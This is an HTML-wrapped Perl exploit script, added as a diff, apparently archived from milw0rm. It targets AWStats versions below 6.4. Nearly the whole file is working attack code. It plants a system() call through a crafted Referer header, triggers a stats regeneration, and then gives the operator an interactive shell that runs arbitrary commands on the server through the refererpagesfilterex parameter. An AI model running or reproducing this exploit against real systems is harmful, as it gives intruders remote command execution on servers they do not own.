@@ -1,0 +1,86 @@
+<html><head><title>AWStats < 6.4 (referer) Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl
+
+## AWStats &lt; 6.4 command execution exploit
+## based on http://www.idefense.com/application/poi/display?id=290&amp;type=vulnerabilities
+## (c)oded by 1dt.w0lf
+## 11.08.2005
+## RST/GHC
+## http://rst.void.ru
+## http://ghc.ru
+
+## Note
+## Exploitation will not occur until the stats page has been regenerated
+## with the tainted referrer values from the http access log.
+## AWStats is only vulnerable in situations where at least one URLPlugin is enabled.
+
+
+use LWP::UserAgent;
+use HTTP::Headers;
+
+if(@ARGV&lt;1) { &amp;usage; exit(0); }
+
+$path = $ARGV[0];
+header();
+print &quot;Creating shell... Please wait\n&quot;;
+
+ $aw = LWP::UserAgent-&gt;new() or die;
+ $req = HTTP::Request-&gt;new(GET =&gt; $path);
+ $req-&gt;referer(qq[http://'.system(\$FilterEx{\'refererpages\'}).']);
+ $res = $aw-&gt;request($req); 
+ 
+ $aw = LWP::UserAgent-&gt;new() or die;
+ $res = $aw-&gt;get($path.'?output=refererpages&amp;update=1');
+
+while ()
+ {
+    print &quot;Type command for execute or 'q' for exit # &quot;;
+    while(&lt;STDIN&gt;)
+     {
+        $cmd=$_;
+        chomp($cmd);
+        exit() if ($cmd eq 'q');
+        last;
+     }
+    &amp;run($cmd);
+ }
+
+sub run()
+ {
+ $cmd2  = 'echo 1 &amp;&amp; echo _START_ &amp;&amp; ';
+ $cmd2 .= $cmd;
+ $cmd2 .= ' &amp;&amp; echo _END_';
+ $aw = LWP::UserAgent-&gt;new() or die;
+ $res = $aw-&gt;post(
+                  &quot;$path&quot;,
+                  {
+                   &quot;output&quot; =&gt; &quot;refererpages&quot;,
+                   &quot;refererpagesfilterex&quot; =&gt; &quot;$cmd2&quot;
+                  }
+                 );
+ @result = split(/\n/,$res-&gt;content);
+ $runned = 0;
+ $on = 0;
+ print &quot;\n&quot;;
+ for $res(@result)
+  {
+    if ($res =~ /^_END_/) { print &quot;\n&quot;; return 0; }
+    if ($on == 1) { print &quot;  $res\n&quot;; }
+    if ($res =~ /^_START_/) { $on = 1; $runned = 1; } 
+  }
+ print &quot;Can't execute command\n&quot; if !$runned;
+ }
+
+sub header()
+{
+ print &quot;--* AWStats &lt; 6.4 exploit by RST/GHC\n&quot;;
+ print &quot;--* keep it private, not for public\n&quot;;
+}
+
+sub usage()
+ {
+  header();
+  print &quot;usage : r57awstats.pl [path_to_awstats.pl]\n&quot;;
+  print &quot;  e.g.: r57awstats.pl http://127.0.0.1/cgi-bin/awstats.pl\n&quot;;
+ }
+
+# milw0rm.com [2006-02-17]</pre></html>
